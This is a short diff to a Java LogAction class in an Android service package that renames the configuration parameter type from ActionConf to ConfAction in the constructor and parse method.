@@ -14,6 +14,7 @@ import java.io.IOException;
 import org.json.JSONObject;
 
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.Evidence;
 import com.android.service.util.Check;
@@ -34,7 +35,7 @@ public class LogAction extends SubAction {
 	 * @param params
 	 *            the conf params
 	 */
-	public LogAction(final ActionConf params) {
+	public LogAction(final ConfAction params) {
 		super(params);
 	}
 
@@ -51,7 +52,7 @@ public class LogAction extends SubAction {
 	}
 
 	@Override
-	protected boolean parse(ActionConf params) {
+	protected boolean parse(ConfAction params) {
 
 		try {
 			this.msg = params.getString("text");
